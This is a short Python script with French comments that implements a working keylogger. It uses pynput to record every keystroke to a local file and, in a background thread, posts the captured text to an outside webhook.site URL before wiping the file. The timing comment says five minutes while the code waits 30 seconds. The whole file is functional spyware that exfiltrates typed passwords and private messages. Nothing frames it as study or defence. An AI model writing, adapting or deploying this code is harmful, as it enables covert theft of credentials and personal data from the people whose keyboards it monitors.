from pynput import keyboard
import requests
import threading
import time

# Nom du fichier où les entrées seront enregistrées
log_file = "key_log.txt"
# URL du serveur où les données seront envoyées
server_url = "https://webhook.site/0099ad1f-4210-4c9e-b9ff-444a67de2e15"  # Remplacez par votre URL Webhook

def format_key(key):
    """Formate les touches pour les rendre plus lisibles."""
    try:
        return key.char
    except AttributeError:
        if key == keyboard.Key.space:
            return " "
        elif key == keyboard.Key.enter:
            return "\n"
        elif key == keyboard.Key.tab:
            return "[TAB]"
        elif key == keyboard.Key.backspace:
            return "[BACKSPACE]"
        elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            return "[SHIFT]"
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            return "[CTRL]"
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            return "[ALT]"
        elif key == keyboard.Key.cmd:
            return "[CMD]"
        else:
            return f"[{key}]"

def on_press(key):
    formatted_key = format_key(key)
    with open(log_file, "a") as f:
        f.write(formatted_key)

def send_logs():
    """Envoie le contenu du fichier log au serveur toutes les 300 secondes (5 minutes)."""
    while True:
        try:
            print(f"Envoi des logs vers : {server_url}")  # Debug: Vérifier l'URL
            with open(log_file, "r") as f:
                data = f.read()
                if data.strip():
                    response = requests.post(server_url, data={'log': data})
                    if response.status_code == 200:
                        print("Logs envoyés avec succès")
                        # Efface le fichier après envoi
                        open(log_file, "w").close()
                    else:
                        print(f"Erreur: Statut HTTP {response.status_code}")
        except Exception as e:
            print(f"Erreur lors de l'envoi des logs: {e}")

        # Attendre 300 secondes (5 minutes) avant le prochain envoi
        time.sleep(30)

# Démarre le thread pour envoyer les logs
threading.Thread(target=send_logs, daemon=True).start()

# Crée un listener qui écoute les touches du clavier
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
